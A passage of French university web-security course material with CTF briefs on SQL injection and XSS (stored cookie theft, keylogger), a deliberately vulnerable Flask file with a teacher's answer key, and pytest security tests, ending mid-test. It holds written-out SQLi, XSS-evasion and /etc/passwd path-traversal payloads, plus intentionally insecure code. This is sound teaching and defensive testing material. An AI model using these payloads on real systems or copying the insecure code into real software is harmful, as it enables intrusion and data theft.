3. Analyse : les mots de passe hashés sont-ils craquables ?

---

#### Challenge 3 — Blind SQL Injection *(20 pts)*

**Contexte :** La route `/api/users/<id>` est vulnérable à une injection booléenne.

**Objectif :** Extraire la valeur de `SECRET_KEY` depuis la table `config` via une injection blind.

**Principe :**
```
/api/users/1 AND 1=1--   → réponse normale (200)
/api/users/1 AND 1=2--   → réponse différente (404)

→ En testant caractère par caractère, vous pouvez extraire des données
```

**Travail attendu :**
1. Script Python (`exploit_blind_sqli.py`) avec extraction automatisée
2. Valeur de la `SECRET_KEY` récupérée
3. Explication de l'approche (dichotomie ou brute-force)

**Bonus :** Utiliser `sqlmap` pour automatiser et comparer les résultats

---

#### Challenge 4 — XSS Réfléchie *(5 pts)*

**Contexte :** La route `/search` réfléchit le paramètre `q` sans encodage.

**Objectif :** Exécuter `alert(document.cookie)` dans le navigateur.

**Travail attendu :**
1. URL complète déclenchant le XSS
2. Screenshot de l'alerte avec le cookie de session visible
3. Scénario d'attaque réaliste (comment un attaquant exploiterait ceci)

---

#### Challenge 5 — XSS Stockée *(10 pts)*

**Contexte :** Les commentaires sont affichés sans sanitization.

**Objectif 1 :** Poster un commentaire qui vole le cookie de tout visiteur.

**Objectif 2 :** Mettre en place un "keylogger" JavaScript (capture les frappes clavier).

**Simulation :**
```python
# Simuler une victime visitant la page :
# Ouvrir un second navigateur (ou fenêtre privée) connecté avec alice
# → Le payload doit s'exécuter dans ce contexte
```

**Travail attendu :**
1. Payload XSS utilisé
2. Script `evil_server.py` (serveur recevant les données volées)
3. Preuve de réception des cookies/frappes

---

### 📋 PARTIE B — Corrections (40 pts)

Pour chaque vulnérabilité identifiée, fournir :

#### Structure de correction attendue

```python
# fichier : corrections/routes_fixed.py

# ─── CORRECTION 1 : SQL Injection Login ───────────────────
# Vulnérabilité : CWE-89
# Ligne originale vulnérable : 45
# Principe de correction : requêtes paramétrées via ORM

# CODE VULNÉRABLE (à titre d'illustration) :
# query = f"SELECT * FROM user WHERE email = '{email}'"

# ✅ CODE CORRIGÉ :
user = User.query.filter_by(email=email).first()
if user and user.check_password(password):
    login_user(user)
```

#### Grille de correction Partie B

| Correction | Critères | Points |
|------------|----------|--------|
| SQLi Login | ORM/params, pas de concaténation, test inclus | /8 |
| SQLi Search | ilike paramétré, limitation résultats | /8 |
| XSS Réfléchie | Suppression \|safe, autoescape actif | /6 |
| XSS Stockée | Bleach avec allowlist, preuve test | /10 |
| Bypass filtres XSS (bonus) | CSP header fonctionnel | /+5 |

---

### 📦 Livrables attendus

```
<NOM1>_<NOM2>_ctf_s1.zip
├── exploits/
│   ├── exploit_sqli_login.py      # Challenge 1
│   ├── exploit_sqli_union.py      # Challenge 2
│   ├── exploit_blind_sqli.py      # Challenge 3
│   ├── exploit_xss_reflected.py   # Challenge 4 (ou URL + explication)
│   └── exploit_xss_stored.py      # Challenge 5
├── corrections/
│   ├── routes_fixed.py
│   └── templates_fixed/
│       ├── search.html
│       └── comments.html
├── preuves/
│   ├── screenshot_sqli_bypass.png
│   ├── dump_users.txt
│   ├── screenshot_xss_reflected.png
│   └── screenshot_xss_stored.png
└── rapport.md
```

### 📝 Template rapport.md

```markdown
# Rapport CTF - Injections SQL & XSS
**Binôme :** Prénom NOM 1 / Prénom NOM 2
**Date :** JJ/MM/AAAA
**Version VulnPyApp :** student-starter

## Résumé exécutif
[3-5 lignes : vulnérabilités trouvées, impact global]

## Challenge 1 - SQLi Login Bypass
### Vulnérabilité identifiée
- Fichier : app.py, ligne X
- Type : CWE-89
- CVSS v3.1 Score : X.X (Vecteur : ...)

### Exploitation
**Payload :**
```
[votre payload]
```
**Requête SQL générée :**
```sql
[requête reconstituée]
```
**Preuve :** [screenshot]

### Correction appliquée
[code corrigé commenté]

### Vérification
[test prouvant que la correction fonctionne]

---
[Répéter pour chaque challenge]

## Bilan
| Challenge | Exploité | Corrigé | Points estimés |
|-----------|----------|---------|----------------|
| 1 SQLi Login | ✅/❌ | ✅/❌ | /10 |
| 2 SQLi UNION | ✅/❌ | ✅/❌ | /15 |
| 3 Blind SQLi | ✅/❌ | ✅/❌ | /20 |
| 4 XSS Reflect | ✅/❌ | ✅/❌ | /5 |
| 5 XSS Stored | ✅/❌ | ✅/❌ | /10 |

## Difficultés rencontrées
[Ce qui a posé problème, comment vous avez résolu]

## Sources consultées
[Références OWASP, PortSwigger, etc.]
```

---

### ⚖️ Grille d'évaluation CTF

```
┌──────────────────────────────────────────────────────────────┐
│                    GRILLE D'ÉVALUATION                       │
│                   CTF - Injections / XSS                     │
├─────────────────────────────┬────────┬──────────────────────┤
│ Critère                     │ Points │ Détail               │
├─────────────────────────────┼────────┼──────────────────────┤
│ EXPLOITATION (60%)          │        │                      │
│  Challenge 1 - SQLi Login   │ /10    │ Payload + explication│
│  Challenge 2 - UNION dump   │ /15    │ Script + données     │
│  Challenge 3 - Blind SQLi   │ /20    │ Script + résultat    │
│  Challenge 4 - XSS Reflect  │ /5     │ URL + screenshot     │
│  Challenge 5 - XSS Stored   │ /10    │ Payload + preuve     │
├─────────────────────────────┼────────┼──────────────────────┤
│ CORRECTIONS (40%)           │        │                      │
│  SQLi Login fix             │ /8     │ Code + test          │
│  SQLi Search fix            │ /8     │ Code + test          │
│  XSS Réfléchie fix          │ /6     │ Template corrigé     │
│  XSS Stockée fix + Bleach   │ /10    │ Code + allowlist     │
│  Tests pytest passants      │ /8     │ ≥80% de réussite     │
├─────────────────────────────┼────────┼──────────────────────┤
│ QUALITÉ RAPPORT             │ /10    │ Structure, clarté    │
├─────────────────────────────┼────────┼──────────────────────┤
│ BONUS                       │        │                      │
│  CSP header fonctionnel     │ +5     │                      │
│  Sqlmap utilisé + analysé   │ +3     │                      │
│  Bypass filtre XSS          │ +3     │                      │
├─────────────────────────────┼────────┼──────────────────────┤
│ TOTAL                       │ /100   │                      │
└─────────────────────────────┴────────┴──────────────────────┘

Pénalités :
  - Rapport absent ou < 1 page : -20 pts
  - Code copié sans compréhension démontrée : -30 pts
  - Rendu en retard (>24h) : -10 pts/jour
```

---
---

# 📋 FICHE EXERCICE 2A — Revue de Code Sécurité
## Formation SECE843 | Séance 2 | Travail individuel en séance (45 min)

```
┌─────────────────────────────────────────────────────────────┐
│  Durée : 45 minutes EN SÉANCE (documents autorisés)         │
│  Rendu : PDF via formulaire en ligne avant la fin de séance │
│  Pondération : 15% de la note finale                        │
└─────────────────────────────────────────────────────────────┘
```

### 🎯 Consigne

Le code suivant est un extrait d'une application Flask de gestion de commandes. Il contient **6 vulnérabilités de sécurité**.

**Pour chaque vulnérabilité :**
1. Indiquer le numéro de ligne
2. Nommer la vulnérabilité
3. Donner le CWE correspondant
4. Évaluer le score CVSS v3.1 (vecteur simplifié accepté)
5. Proposer une correction (code ou description)

---

### 📄 Code à analyser — `orders_api.py`

```python
# orders_api.py - API de gestion des commandes
# Version : 1.0 (production)
import os
import hashlib
import sqlite3
from flask import Flask, request, jsonify, render_template_string, session

app = Flask(__name__)
app.secret_key = "flask_secret_2024"                          # ligne 8

db_path = "orders.db"


def get_db():
    return sqlite3.connect(db_path)


# ── Authentification ──────────────────────────────────────────
@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')

    # Hashage du mot de passe
    pwd_hash = hashlib.md5(password.encode()).hexdigest()      # ligne 23

    conn = get_db()
    query = f"""
        SELECT id, username, role
        FROM users
        WHERE username = '{username}'                          # ligne 29
        AND password_hash = '{pwd_hash}'
    """
    cursor = conn.execute(query)                               # ligne 32
    user = cursor.fetchone()
    conn.close()

    if user:
        session['user_id'] = user[0]
        session['username'] = user[1]
        session['role'] = user[2]
        return jsonify({'status': 'ok', 'role': user[2]})

    return jsonify({'status': 'error', 'message': 'Invalid credentials'}), 401


# ── Commandes ────────────────────────────────────────────────
@app.route('/api/orders/<int:order_id>', methods=['GET'])
def get_order(order_id):
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    conn = get_db()
    # Récupération de la commande par ID
    order = conn.execute(
        "SELECT * FROM orders WHERE id = ?", (order_id,)
    ).fetchone()                                               # ligne 52
    conn.close()

    if not order:
        return jsonify({'error': 'Not found'}), 404

    return jsonify({
        'id': order[0],
        'user_id': order[1],
        'product': order[2],
        'amount': order[3],
        'address': order[4]
    })


@app.route('/api/orders', methods=['POST'])
def create_order():
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    data = request.get_json()

    # Création de la commande avec toutes les données reçues
    conn = get_db()
    conn.execute("""
        INSERT INTO orders (user_id, product, amount, address, status, is_paid)
        VALUES (?, ?, ?, ?, ?, ?)
    """, (
        data.get('user_id', session['user_id']),               # ligne 77
        data.get('product'),
        data.get('amount'),
        data.get('address'),
        data.get('status', 'pending'),                         # ligne 81
        data.get('is_paid', 0)                                 # ligne 82
    ))
    conn.commit()
    conn.close()
    return jsonify({'status': 'created'}), 201


# ── Administration ───────────────────────────────────────────
@app.route('/admin/report')
def admin_report():
    if session.get('role') != 'admin':
        return jsonify({'error': 'Forbidden'}), 403

    report_name = request.args.get('report', 'default')

    # Rendu du rapport
    template = f"""
    <html>
    <body>
        <h1>Rapport : {report_name}</h1>                      # ligne 98
        <p>Généré par : {session['username']}</p>
        <p>Total commandes : {{{{ total }}}}</p>
    </body>
    </html>
    """
    conn = get_db()
    total = conn.execute("SELECT COUNT(*) FROM orders").fetchone()[0]
    conn.close()
    return render_template_string(template, total=total)       # ligne 107


# ── Export ───────────────────────────────────────────────────
@app.route('/api/export')
def export_data():
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    filename = request.args.get('filename', 'export.csv')
    filepath = os.path.join('/app/exports', filename)          # ligne 116

    if os.path.exists(filepath):
        with open(filepath, 'r') as f:                        # ligne 118
            content = f.read()
        return content, 200, {'Content-Type': 'text/plain'}

    return jsonify({'error': 'File not found'}), 404


# ── Notifications ─────────────────────────────────────────────
@app.route('/api/notify', methods=['POST'])
def send_notification():
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    data = request.get_json()
    email = data.get('email', '')

    # Envoi de notification par email via sendmail
    os.system(f"sendmail -t {email} < /app/templates/notification.txt")  # ligne 133

    return jsonify({'status': 'sent'})


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')                       # ligne 138
```

---

### 📝 
### 📝 Grille de réponse — Exercice 2A

```
┌─────────────────────────────────────────────────────────────────────────────┐
│  Nom / Prénom : ________________________________  Date : __________________ │
│  Durée restante : [  ] 45 min  [  ] 30 min  [  ] 15 min                    │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

#### Vulnérabilité 1

```
Ligne(s)     : _______
Nom          : ________________________________________________
CWE          : CWE-_______
CVSS Score   : _______ / 10   Vecteur : AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_
Impact       : ________________________________________________

Correction :
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│                                                             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### Vulnérabilité 2

```
Ligne(s)     : _______
Nom          : ________________________________________________
CWE          : CWE-_______
CVSS Score   : _______ / 10   Vecteur : AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_
Impact       : ________________________________________________

Correction :
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│                                                             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### Vulnérabilité 3

```
Ligne(s)     : _______
Nom          : ________________________________________________
CWE          : CWE-_______
CVSS Score   : _______ / 10   Vecteur : AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_
Impact       : ________________________________________________

Correction :
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│                                                             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### Vulnérabilité 4

```
Ligne(s)     : _______
Nom          : ________________________________________________
CWE          : CWE-_______
CVSS Score   : _______ / 10   Vecteur : AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_
Impact       : ________________________________________________

Correction :
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│                                                             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### Vulnérabilité 5

```
Ligne(s)     : _______
Nom          : ________________________________________________
CWE          : CWE-_______
CVSS Score   : _______ / 10   Vecteur : AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_
Impact       : ________________________________________________

Correction :
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│                                                             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### Vulnérabilité 6

```
Ligne(s)     : _______
Nom          : ________________________________________________
CWE          : CWE-_______
CVSS Score   : _______ / 10   Vecteur : AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_
Impact       : ________________________________________________

Correction :
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│                                                             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

### ✅ Corrigé enseignant — Exercice 2A

```
⚠️  NE PAS DISTRIBUER AUX ÉTUDIANTS AVANT LA FIN DE LA SÉANCE
```

| # | Ligne(s) | Vulnérabilité | CWE | CVSS | Correction |
|---|----------|---------------|-----|------|------------|
| 1 | 8 | Secret key statique | CWE-321 | 7.5 | `os.environ.get('SECRET_KEY')` |
| 2 | 23 | MD5 pour hash password | CWE-327 | 8.1 | `bcrypt.generate_password_hash()` |
| 3 | 29-32 | Injection SQL (login) | CWE-89 | 9.8 | `User.query.filter_by()` ORM |
| 4 | 52 | IDOR (get_order) | CWE-639 | 7.5 | Filtrer par `user_id=session['user_id']` |
| 5 | 77-82 | Mass Assignment | CWE-915 | 8.1 | Allowlist + forcer `user_id=session['user_id']` |
| 6 | 98+107 | SSTI | CWE-1336 | 9.8 | `render_template()` avec variable séparée |
| 7 | 116-118 | Path Traversal | CWE-22 | 8.6 | `secure_filename()` + `realpath()` check |
| 8 | 133 | Command Injection | CWE-78 | 9.8 | `subprocess` list form, `shell=False` |
| 9 | 138 | Debug mode en production | CWE-94 | 5.3 | `debug=False`, variable d'env |

```
Note : 6 vulnérabilités requises / 9 présentes
→ Trouver 6+ = note maximale
→ Les étudiants qui trouvent 8 ou 9 = bonus +5 pts
```

---
---

# 📋 FICHE EXERCICE 2B — Audit & Tests de Sécurité
## Formation SECE843 | Séance 2 | Binôme | 1 semaine

```
┌─────────────────────────────────────────────────────────────┐
│  Durée : 1h30 en séance + 1 semaine pour finalisation       │
│  Rendu : dépôt Git privé + rapport PDF                      │
│  Pondération : 25% de la note finale                        │
└─────────────────────────────────────────────────────────────┘
```

### 🎯 Objectifs

- Conduire un audit de sécurité structuré avec méthodologie OWASP
- Rédiger des tests de sécurité automatisés avec pytest
- Utiliser des outils d'analyse statique (Bandit, Safety)
- Produire un rapport d'audit professionnel

---

### 📋 PARTIE A — Audit outillé (40 pts)

#### A1 — Analyse statique avec Bandit *(10 pts)*

```bash
# Installation
pip install bandit

# Analyse du projet (branche vulnérable)
git checkout student-starter
bandit -r . -x ./tests -f json -o bandit_report.json
bandit -r . -x ./tests -f txt  -o bandit_report.txt

# Visualisation
cat bandit_report.txt
```

**Travail attendu :**

```markdown
## Rapport Bandit

### Statistiques
- Fichiers analysés : X
- Issues HIGH severity : X
- Issues MEDIUM severity : X
- Issues LOW severity : X

### Top 5 des issues critiques

| Rank | Fichier | Ligne | Issue | Sévérité | CWE |
|------|---------|-------|-------|----------|-----|
| 1    |         |       |       |          |     |
| 2    |         |       |       |          |     |
...

### Faux positifs identifiés
[Issues Bandit qui ne sont PAS de vraies vulnérabilités + justification]

### Faux négatifs identifiés
[Vulnérabilités connues que Bandit N'A PAS détectées + explication]
```

---

#### A2 — Analyse des dépendances avec Safety *(10 pts)*

```bash
# Installation
pip install safety

# Analyse
safety check -r requirements.txt --json > safety_report.json
safety check -r requirements.txt

# Alternative : pip-audit
pip install pip-audit
pip-audit -r requirements.txt
```

**Travail attendu :**

```markdown
## Rapport Safety / pip-audit

### Dépendances vulnérables identifiées

| Package | Version actuelle | CVE | Sévérité | Description | Fix disponible |
|---------|-----------------|-----|----------|-------------|----------------|
|         |                 |     |          |             |                |

### Recommandations
[Pour chaque CVE : mettre à jour vers X.X.X ou mesure de mitigation]

### requirements.txt mis à jour
[Fournir le fichier avec versions corrigées]
```

---

#### A3 — Tests manuels OWASP Top 10 *(20 pts)*

Tester chaque catégorie OWASP sur l'application :

```markdown
## Checklist OWASP Top 10 2021

### A01 - Broken Access Control
- [ ] IDOR sur /api/orders/<id>
- [ ] Élévation de privilèges via mass assignment
- [ ] Accès direct à /admin sans authentification

Test effectué : ________________________________
Résultat : Vulnérable ✅ / Non vulnérable ❌
Preuve : [screenshot/payload]

### A02 - Cryptographic Failures
- [ ] Algorithme de hashage des mots de passe
- [ ] Transmission en clair (HTTP vs HTTPS)
- [ ] Clés secrètes en dur dans le code

Test effectué : ________________________________
Résultat : Vulnérable ✅ / Non vulnérable ❌

### A03 - Injection
- [ ] SQL Injection (login, search, API)
- [ ] Command Injection (/ping, /notify)
- [ ] SSTI (/hello, /admin/report)

Test effectué : ________________________________
Résultat : Vulnérable ✅ / Non vulnérable ❌

### A04 - Insecure Design
- [ ] Absence de rate limiting sur /login
- [ ] Pas de politique de mots de passe
- [ ] Gestion d'erreurs exposant des infos

### A05 - Security Misconfiguration
- [ ] Debug mode actif
- [ ] Headers de sécurité manquants
- [ ] Cookies sans flags Secure/HttpOnly

### A06 - Vulnerable Components
[Résultats Safety/pip-audit]

### A07 - Auth Failures
- [ ] Brute-force possible sur /login
- [ ] Session non invalidée à la déconnexion
- [ ] Tokens prévisibles

### A08 - Software & Data Integrity
- [ ] Absence vérification intégrité uploads
- [ ] CSRF sur les formulaires

### A09 - Logging Failures
- [ ] Tentatives d'authentification non loguées
- [ ] Informations sensibles dans les logs
- [ ] Pas d'alerting sur comportements suspects

### A10 - SSRF
- [ ] Tester si l'app fait des requêtes vers URLs fournies par l'utilisateur
```

---

### 📋 PARTIE B — Tests automatisés pytest *(40 pts)*

Compléter le fichier `tests/test_security_student.py` :

```python
# tests/test_security_student.py
"""
Tests de sécurité à compléter.
Objectif : 100% des tests doivent ÉCHOUER sur la branche vulnérable
           et PASSER sur la branche remediated.
"""
import pytest
import re
from app import create_app, db
from models import User, Comment, Order


@pytest.fixture
def app():
    app = create_app('testing')
    with app.app_context():
        db.create_all()
        # Créer utilisateurs de test
        alice = User(email='alice@test.com', username='alice', is_admin=False)
        alice.set_password('Alice123!')
        bob = User(email='bob@test.com', username='bob', is_admin=False)
        bob.set_password('Bob123!')
        admin = User(email='admin@test.com', username='admin', is_admin=True)
        admin.set_password('Admin123!')
        db.session.add_all([alice, bob, admin])
        db.session.commit()
        yield app
        db.drop_all()


@pytest.fixture
def client(app):
    return app.test_client()


@pytest.fixture
def alice_client(client):
    """Client connecté en tant qu'alice"""
    client.post('/login', data={
        'email': 'alice@test.com',
        'password': 'Alice123!'
    })
    return client


# ═══════════════════════════════════════════════════════════════
# SECTION 1 — SQL INJECTION (20 pts)
# ═══════════════════════════════════════════════════════════════

class TestSQLInjection:

    def test_login_sqli_bypass_blocked(self, client):
        """
        TODO : Vérifier que le payload SQLi de bypass est bloqué.
        Le payload ' OR '1'='1' -- ne doit pas permettre la connexion.
        Assertion attendue : status_code == 401 ou redirection vers login
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        payload = {
            'email': "' OR '1'='1' --",
            'password': 'anything'
        }
        response = ...  # effectuer la requête POST /login
        assert ...      # vérifier que la connexion est refusée
        # ───────────────────────────────────────────────────────

    def test_login_sqli_comment_blocked(self, client):
        """
        TODO : Tester le payload avec commentaire SQL '--'
        L'email admin'-- ne doit pas permettre la connexion.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        pass
        # ───────────────────────────────────────────────────────

    def test_search_union_injection_blocked(self, alice_client):
        """
        TODO : Vérifier que l'injection UNION sur /search est bloquée.
        Le payload UNION SELECT ne doit pas retourner des données
        de la table 'user' dans les résultats de recherche.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        sqli_payload = "' UNION SELECT id,email,password_hash,4,5 FROM user--"
        response = ...
        data = response.get_data(as_text=True)
        # Vérifier qu'aucun email @test.com n'apparaît dans les résultats
        assert ...
        # ───────────────────────────────────────────────────────

    def test_search_normal_query_works(self, alice_client):
        """
        TODO : S'assurer que la recherche normale fonctionne toujours
        après correction (test de non-régression).
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        pass
        # ───────────────────────────────────────────────────────

    def test_api_blind_sqli_boolean_blocked(self, alice_client, app):
        """
        TODO : Vérifier que l'injection booléenne est bloquée sur
        /api/users/<id>. Les deux requêtes suivantes doivent retourner
        le même résultat (pas de différence exploitable).
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        pass
        # ───────────────────────────────────────────────────────


# ═══════════════════════════════════════════════════════════════
# SECTION 2 — XSS (20 pts)
# ═══════════════════════════════════════════════════════════════

class TestXSS:

    def test_xss_reflected_search_escaped(self, alice_client):
        """
        TODO : Vérifier que le XSS réfléchi sur /search est échappé.
        La balise <script> doit apparaître encodée dans la réponse HTML,
        pas comme balise HTML active.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        xss_payload = '<script>alert(1)</script>'
        response = alice_client.get(f'/search?q={xss_payload}')
        data = response.get_data(as_text=True)

        # La balise ne doit PAS être présente telle quelle
        assert '<script>alert(1)</script>' not in data

        # Elle doit être encodée (au moins l'une de ces formes)
        assert '&lt;script&gt;' in data or 'alert' not in data
        # ───────────────────────────────────────────────────────

    def test_xss_stored_bleach_sanitized(self, alice_client, app):
        """
        TODO : Poster un commentaire avec payload XSS et vérifier
        qu'il est sanitisé par Bleach avant stockage ET affichage.
        Les attributs 'onerror', 'onload', 'onclick' doivent être supprimés.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        xss_payload = '<img src="x" onerror="alert(document.cookie)">'

        # Poster le commentaire
        post_response = ...

        # Récupérer la page des commentaires
        get_response = ...
        data = get_response.get_data(as_text=True)

        # L'attribut onerror ne doit pas être présent
        assert 'onerror' not in data
        assert 'alert' not in data
        # ───────────────────────────────────────────────────────

    def test_xss_allowed_tags_preserved(self, alice_client):
        """
        TODO : Vérifier que les tags HTML autorisés par Bleach
        sont bien conservés (b, i, em, strong).
        Test de non-régression : les mises en forme légitimes fonctionnent.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        pass
        # ───────────────────────────────────────────────────────

    def test_xss_script_tag_variants_blocked(self, alice_client):
        """
        TODO : Tester plusieurs variantes de payloads XSS.
        Tous doivent être bloqués/échappés.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        variants = [
            '<script>alert(1)</script>',
            '<SCRIPT>alert(1)</SCRIPT>',
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            'javascript:alert(1)',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>',
        ]
        for payload in variants:
            response = alice_client.post('/comments', data={
                'content': payload,
                'csrf_token': ...  # récupérer le token
            })
            # Vérifier que le payload n'est pas exécutable dans la réponse
            # ─── À COMPLÉTER ─────────────────────────────────
            pass
        # ───────────────────────────────────────────────────────

    def test_csp_header_present(self, client):
        """
        TODO : Vérifier que le header Content-Security-Policy
        est présent dans les réponses et contient les directives minimales.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        response = client.get('/')
        csp = response.headers.get('Content-Security-Policy', '')

        assert csp != '', "CSP header manquant"
        assert "default-src" in csp or "script-src" in csp
        assert "unsafe-inline" not in csp, "unsafe-inline interdit dans script-src"
        # ───────────────────────────────────────────────────────


# ═══════════════════════════════════════════════════════════════
# SECTION 3 — AUTHENTIFICATION & SESSIONS (20 pts)
# ═══════════════════════════════════════════════════════════════

class TestAuthentication:

    def test_password_not_md5(self, app):
        """
        TODO : Vérifier que les mots de passe ne sont pas hashés en MD5.
        Un hash MD5 fait 32 caractères hexadécimaux.
        Un hash bcrypt commence par $2b$.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        with app.app_context():
            user = User.query.filter_by(email='alice@test.com').first()
            pwd_hash = user.password_hash

            # Ne doit pas être MD5 (32 hex chars)
            assert not re.match(r'^[a-f0-9]{32}$', pwd_hash), \
                "MD5 détecté ! Utiliser bcrypt."

            # Doit être bcrypt
            assert pwd_hash.startswith('$2b$') or pwd_hash.startswith('$2a$'), \
                "Le hash doit être bcrypt."
        # ───────────────────────────────────────────────────────

    def test_rate_limiting_login(self, client):
        """
        TODO : Vérifier que le rate limiting est en place sur /login.
        Après N tentatives échouées, l'application doit retourner 429.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        failed_attempts = 0
        got_rate_limited = False

        for i in range(10):
            response = client.post('/login', data={
                'email': 'alice@test.com',
                'password': f'wrong_password_{i}'
            })
            if response.status_code == 429:
                got_rate_limited = True
                break
            failed_attempts += 1

        assert got_rate_limited, \
            f"Rate limiting non déclenché après {failed_attempts} tentatives"
        # ───────────────────────────────────────────────────────

    def test_session_cookie_httponly(self, client):
        """
        TODO : Vérifier que le cookie de session a le flag HttpOnly.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        client.post('/login', data={
            'email': 'alice@test.com',
            'password': 'Alice123!'
        })
        cookies = client.cookie_jar
        for cookie in cookies:
            if 'session' in cookie.name.lower() or 'sid' in cookie.name.lower():
                assert cookie.has_nonstandard_attr('HttpOnly') or \
                       getattr(cookie, '_rest', {}).get('HttpOnly') is not None, \
                    "Cookie de session sans flag HttpOnly"
        # ───────────────────────────────────────────────────────

    def test_session_invalidated_on_logout(self, alice_client):
        """
        TODO : Vérifier que la session est bien invalidée après logout.
        Une requête authentifiée après logout doit retourner 401 ou redirect.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        # Vérifier qu'on est bien connecté
        response_before = alice_client.get('/profile')
        assert response_before.status_code == 200

        # Se déconnecter
        alice_client.get('/logout')

        # Une route protégée doit être inaccessible
        response_after = alice_client.get('/profile')
        assert response_after.status_code in [302, 401], \
            "Session toujours valide après logout"
        # ───────────────────────────────────────────────────────


# ═══════════════════════════════════════════════════════════════
# SECTION 4 — CONTRÔLE D'ACCÈS (20 pts)
# ═══════════════════════════════════════════════════════════════

class TestAccessControl:

    def test_idor_order_access_blocked(self, app, client):
        """
        TODO : Alice ne doit pas pouvoir accéder à la commande de Bob.
        Créer une commande pour Bob, tenter d'y accéder avec Alice.
        Résultat attendu : 403 ou 404.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        with app.app_context():
            # Récupérer les IDs
            alice = User.query.filter_by(email='alice@test.com').first()
            bob   = User.query.filter_by(email='bob@test.com').first()

            # Créer une commande appartenant à Bob
            bob_order = Order(
                user_id=bob.id,
                product='Secret Product',
                amount=999.99
            )
            db.session.add(bob_order)
            db.session.commit()
            bob_order_id = bob_order.id

        # Connecter Alice
        client.post('/login', data={
            'email': 'alice@test.com',
            'password': 'Alice123!'
        })

        # Alice tente d'accéder à la commande de Bob
        response = client.get(f'/api/orders/{bob_order_id}')
        assert response.status_code in [403, 404], \
            f"IDOR : Alice peut accéder à la commande de Bob ! (status {response.status_code})"
        # ───────────────────────────────────────────────────────

    def test_mass_assignment_is_admin_blocked(self, client):
        """
        TODO : Vérifier que l'inscription avec is_admin=true
        ne crée pas un compte administrateur.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        response = client.post('/register', data={
            'email': 'hacker@test.com',
            'username': 'hacker',
            'password': 'Hack123!',
            'bio': 'innocent bio',
            'is_admin': 'true',      # tentative de mass assignment
            'role': 'admin',         # autre tentative
        })

        # Vérifier que le compte créé n'est PAS admin
        # ─── À COMPLÉTER ─────────────────────────────────────
        pass
        # ───────────────────────────────────────────────────────

    def test_admin_panel_requires_admin_role(self, alice_client):
        """
        TODO : Vérifier que /admin est inaccessible à un utilisateur normal.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        response = alice_client.get('/admin')
        assert response.status_code in [302, 403], \
            "Panel admin accessible à un utilisateur non-admin"
        # ───────────────────────────────────────────────────────

    def test_csrf_protection_active(self, alice_client):
        """
        TODO : Vérifier que les requêtes POST sans token CSRF sont rejetées.
        Une requête POST /profile/update sans csrf_token doit retourner 400.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        response = alice_client.post('/profile/update', data={
            'username': 'newname'
            # Pas de csrf_token intentionnellement
        })
        assert response.status_code == 400, \
            "Requête sans CSRF token acceptée !"
        # ───────────────────────────────────────────────────────


# ═══════════════════════════════════════════════════════════════
# SECTION 5 — INJECTIONS AVANCÉES (BONUS - 10 pts)
# ═══════════════════════════════════════════════════════════════

class TestAdvancedInjections:

    def test_ssti_blocked(self, client):
        """
        TODO : Vérifier que le SSTI sur /hello est bloqué.
        Le payload {{ 7*7 }} ne doit pas retourner 49.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        response = client.get('/hello?name={{ 7*7 }}')
        data = response.get_data(as_text=True)
        assert '49' not in data, \
            "SSTI détecté : {{ 7*7 }} a été évalué → résultat 49"
        # ───────────────────────────────────────────────────────

    def test_path_traversal_blocked(self, alice_client):
        """
        TODO : Vérifier que le path traversal sur /download est bloqué.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        payloads = [
            '../../../etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '....//....//etc/passwd',
        ]
        for payload in payloads:
            response = alice_client.get(f'/download?filename={payload}')
            assert response.status_code in [400, 403, 404], \
                f"Path traversal possible avec : {payload}"
            # Le contenu /etc/passwd ne doit jamais apparaître
            assert 'root:' not in response.get_data(as_text=True)
        # ───────────────────────────────────────────────────────

    def test_command_injection_blocked(self, alice_client):
        """
        TODO : Vérifier que l'injection de commande sur /ping est bloquée.
        """
